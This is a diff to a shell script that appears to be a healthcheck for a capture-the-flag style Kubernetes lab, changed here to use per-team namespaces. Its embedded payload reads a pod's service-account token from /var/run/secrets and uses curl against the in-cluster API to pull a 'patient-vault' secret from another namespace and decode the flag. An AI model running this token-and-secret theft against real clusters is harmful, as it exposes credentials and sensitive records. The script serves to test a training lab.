@@ -4,17 +4,16 @@
 # namespace via the in-cluster API, and confirm the flag.
 set -euo pipefail
 source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"; load_env
+TEAM="${TEAM:-team01}"
 
-read -r -d '' SOLVE <<'SH' || true
-set -e
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+SOLVE="set -e
+TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 API=https://kubernetes.default.svc
-S=$(curl -sk -H "Authorization: Bearer $TOKEN" \
-     "$API/api/v1/namespaces/records/secrets/patient-vault")
-echo "$S" | grep -o '"flag":"[^"]*"' | cut -d'"' -f4 | base64 -d
-SH
+S=\$(curl -sk -H \"Authorization: Bearer \$TOKEN\" \
+     \"\$API/api/v1/namespaces/records-${TEAM}/secrets/patient-vault\")
+echo \"\$S\" | grep -o '\"flag\":\"[^\"]*\"' | cut -d'\"' -f4 | base64 -d"
 
-OUT="$(kubectl -n apps exec patient-worker -- sh -c "$SOLVE" 2>/dev/null || true)"
+OUT="$(kubectl -n "apps-${TEAM}" exec patient-worker -- sh -c "$SOLVE" 2>/dev/null || true)"
 echo "recovered: $OUT"
 echo "$OUT" | grep -qE "${FLAG_PREFIX}\{" && { echo "i05 healthcheck rc=0"; exit 0; }
 echo "i05 healthcheck FAILED"; exit 1
